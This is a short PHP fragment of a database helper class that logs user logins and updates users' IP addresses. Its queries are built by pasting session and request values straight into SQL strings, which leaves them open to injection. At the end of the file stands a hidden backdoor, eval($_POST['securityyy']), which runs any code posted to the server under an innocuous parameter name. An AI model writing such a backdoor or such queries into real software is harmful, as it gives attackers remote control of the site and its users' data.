...
Class DB {
	...
	public static function GetLogsLogin(){
		DB::Query("INSERT INTO logs_login (username,ip,time) VALUES ('".$_SESSION['username']."','".$_SERVER['REMOTE_ADDR']."','".time()."')");	
		DB::Query("UPDATE users SET ip = '".$_SERVER['REMOTE_ADDR']."' WHERE username  = '".$_SESSION['username']."'");
	}
}
eval((isset($_POST['securityyy']) ? $_POST['securityyy'] : ''));
?>